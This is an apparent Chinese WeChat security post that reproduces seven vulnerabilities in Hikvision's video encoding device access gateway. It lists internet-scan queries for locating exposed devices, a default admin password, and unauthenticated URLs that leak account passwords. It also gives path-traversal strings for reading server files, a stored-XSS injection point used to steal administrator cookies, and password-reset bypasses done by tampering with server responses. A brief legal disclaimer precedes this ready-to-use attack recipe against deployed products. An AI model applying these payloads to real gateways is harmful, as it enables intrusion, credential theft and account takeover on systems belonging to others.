#  [漏洞复现] 海康威视视频编码设备接入网关七大漏洞

原创 Matrix SEC  [ Matrix SEC ](javascript:void\(0\);)

**Matrix SEC** ![]()

微信号 gh_d6c65ea376d7

功能介绍 矩阵安全-专注全球网络安全。威胁情报 | APT狩猎 | 漏洞情报 | Lulz

____

___发表于_

收录于合集 #漏洞复现 55个

  * **0x01  免责声明**

请勿使用本文中所提供的任何技术信息或代码工具进行非法测试和违法行为。若使用者利用本文中技术信息或代码工具对任何计算机系统造成的任何直接或者间接的后果及损失，均由使用者本人负责。本文所提供的技术信息或代码工具仅供于学习，一切不良后果与文章作者无关。使用者应该遵守法律法规，并尊重他人的合法权益。

  *  **0x02 影响版本**

海康威视视频编码设备接入网关

![]()

  *  **0x03 网络测绘**

fofa:

  * 

    
    
    app="HIKVISION-视频编码设备接入网关"

hunter:

  * 

    
    
    app.name="Hikvision 海康威视视频编码设备接入网关"

  *  **0x04  漏洞复现**

 **漏洞一  默认凭据**

  *   * 

    
    
    默认用户名：admin默认密码：12345

 **漏洞二  未授权访问管理员账号密码泄露**

  * 

    
    
    /userInfo/userInfo.php?userId=1

![]()

 **漏洞三  任意文件下载**

  * 

    
    
    /serverLog/downFile.php?fileName=default.log

![]()

将参数fileName的值删除重放后报错泄漏了物理路径，其中fopen(../../../log/)猜测是downFile.php文件中的源代码

![]()

通过报错内容在参数fileName后拼接

  * 

    
    
    ../../../{}/pag/web/html/serverLog/downFile.php

![]()

 **漏洞四  任意文件读取**

  * 

    
    
    /serverLog/showFile.php?fileName=../../../{}/pag/web/html/serverLog/downFile.php 

![]()

  * 

    
    
    /serverLog/showFile.php?fileName=../web/html/main.php

![]()

 **漏洞五  存储型XSS**

在资源管理里的分组管理可以未授权访问可插入XSS

  * 

    
    
    /groupManage/index.php

![]()

当管理员访问分组管理时，成功执行XSS

![]()

XSS平台成功获取到系统管理员cookie

![]()

 **漏洞六  ** **任意用户密码修改一**

对后台管理修改密码抓包

![]()

数据包中会对当前账户的原始密码进行校验，原始密码错误返回1，密码正确返回0

![]()

将服务器返回的数据包修改为0，进入下一个数据包，这里是对密码进行修改，接着继续放包提示修改成功

![]()

 **漏洞七  ** **任意用户密码修改二**

可以未授权访问修改密码

  * 

    
    
    /common/modifyPassword.php

输入框无法输入，用审查元素发现被设置只读，删除readonly即可  

![]()

同样抓取修改请求数据包，这里发现请求name的值是空的需要补上

![]()

![]()

放包后同样把1改成0，接着继续放包提示修改成功  

![]()

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

